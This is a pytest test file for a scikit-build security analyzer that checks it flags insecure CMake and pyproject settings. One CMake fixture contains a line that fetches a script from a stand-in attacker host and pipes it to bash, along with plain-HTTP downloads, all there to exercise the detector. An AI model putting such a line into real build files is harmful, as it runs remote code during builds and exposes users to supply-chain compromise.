"""Tests for ScikitBuildAnalyzer."""

from pathlib import Path

from devai.scikit_build_analyzer import ScikitBuildAnalyzer


INSECURE_PYPROJECT = """\
[build-system]
requires = ["scikit-build-core"]
build-backend = "scikit_build_core.build"

[tool.scikit-build]
cmake.version = ">=3.15"
"""

INSECURE_CMAKE = """\
cmake_minimum_required(VERSION 3.15)
project(example)

execute_process(COMMAND curl -s https://evil.example.com/payload.sh | bash)
file(DOWNLOAD "http://insecure.example.com/archive.tar.gz" dest.tar.gz)
FetchContent_Declare(dep GIT_REPOSITORY http://github.com/example/lib.git GIT_TAG main)
"""

HARDENED_PYPROJECT = """\
[build-system]
requires = ["scikit-build-core>=0.5"]
build-backend = "scikit_build_core.build"

[tool.scikit-build]
"""


class TestScikitBuildAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_cmake_issues(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        (tmp_path / "CMakeLists.txt").write_text(INSECURE_CMAKE, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "cmake_exec_process" in kinds
        assert "cmake_download_http" in kinds
        assert "fetch_content_http" in kinds
        assert "unpinned_fetch" in kinds

    def test_ignores_plain_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "plain"\nversion = "1.0.0"\n',
            encoding="utf-8",
        )
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = ScikitBuildAnalyzer(str(tmp_path))
        assert "scikit-build configs:" in analyzer.summary()
        assert "scikit-build analysis:" in analyzer.to_context()

    def test_generate_hardened_config(self):
        snippet = ScikitBuildAnalyzer(".").generate_hardened_config()
        assert "[tool.scikit-build]" in snippet
